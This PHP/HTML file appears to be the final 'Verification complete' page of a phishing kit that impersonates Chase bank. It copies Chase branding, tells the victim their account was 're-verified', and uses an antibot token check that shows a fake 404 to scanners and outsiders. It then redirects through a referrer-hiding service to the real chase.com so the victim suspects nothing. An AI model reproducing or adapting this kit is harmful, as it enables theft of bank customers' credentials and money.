<?php

    session_start();

    require_once '../W/Comp.php';
    require_once '../W/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

?>

<!DOCTYPE html>
<html class="no-js" dir="ltr" lang="en">
    <head>
        <title>Verification complete - Online Verification - chase.com</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="../A/img/favicon.ico">
        <link rel="stylesheet" href="../A/css/Login/blue-ui.css">
        <link rel="stylesheet" href="../A/css/Verify/enroll.css">
    </head>
    <body style="overflow-x: hidden; overflow-y: auto; height: 100%" class="brand-personal">
        <div>
            <div class="enrollment getting-started-wrapper" id="enrollment">
                <div class="toggle-aria-hidden" id="sitemessage" role="region"></div>
                <header class="toggle-aria-hidden" id="enrollment-header" role="banner">
                    <div class="enrollment-header PERSONAL">
                        <div class="col-xs-2 col-sm-4 header-elements"><span id="enrollment-side-menu-icon-iconanchor-wrapper"><a class="jpui iconaction menulines" style="cursor: pointer;" id="enrollment-side-menu-icon"> <span class="util accessible-text" id="accessible-enrollment-side-menu-icon">, opens menu</span> <i class="jpui menulines icon" id="icon-enrollment-side-menu-icon"></i></a></span></div>
                        <div class="col-xs-8 col-sm-4 header-elements"><img src="../A/img/octogon-white.png" alt="Chase"></div>
                    </div>
                </header>
                <main id="enrollment-content">
                    <div class="online-enrollment getting-started">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
                                    <h1 class="H2 online-enrollment-header">Verification Complete</h1>
                                    <div class="jpui progress bar" data-progress="100">
                                        <div class="bar fill"></div>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-sm-2 col-lg-offset-1 hide-xs show-sm enroll-faq-sidebar op-0">
                                    <p>L</p>
                                    <p>L</p>
                                </div>
                                <div class="col-xs-12 col-sm-8 col-lg-6">
                                    <div class="H2 online-enrollment-getting-started">Verification is complete</div>
                                    <h2 class="H4 enrollmentGettingStartedAdvisory mb-0">Your account has successfully been re-verified.</h2>
                                    <div class="center H4">
                                        <div>
                                            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 172 172" style=" fill:#000000;">
                                                <g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
                                                    <path d="M0,172v-172h172v172z" fill="none"></path>
                                                    <g>
                                                        <path d="M161.86633,32.25l-83.033,83.64217l-32.85558,-33.4755l-10.14442,10.22683l43,43.52317l93.16667,-93.912z" fill="rgba(8, 70, 168, .9)"></path>
                                                        <path d="M126.033,32.25l-83.033,83.64217l-32.85558,-33.4755l-10.14442,10.22683l43,43.52317l93.16667,-93.912z" fill="rgba(8, 70, 168, .9)"></path>
                                                    </g>
                                                </g>
                                            </svg>
                                        </div>
                                        <div class="mt-1">
                                            <span>
                                                You will now be redirected back to our home page.
                                                <br>
                                                Thank you for using Chase bank.
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </main>
                <footer id="enrollment-footer">
                    <div class="online-enrollment-footer">
                        <div class="row">
                            <div class="col-xs-10 col-sm-8 col-lg-6 footer-container">
                                <ul class="footer-menu">
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline" style="cursor: pointer;">Privacy </a></span></li>
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline" style="cursor: pointer;">Security</a></span></li>
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline" style="cursor: pointer;">Accessibility</a></span></li>
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline" style="cursor: pointer;">Terms of use</a></span></li>
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline no-right-padding"style="cursor: pointer;">Ad choices</a></span> <img class="adChoices-img" src="../A/img/ad-choices-logo-blue_lite.png" alt=""></li>
                                </ul>
                                <p class="NOTE util center aligned">© 2021 JPMorgan Chase &amp; Co.</p>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
        </div>
        <script>
            setTimeout(() => {
                window.location.href = 'https://nullreferer.com/?https://chase.com';
            }, 5000);
        </script>
    </body>
</html>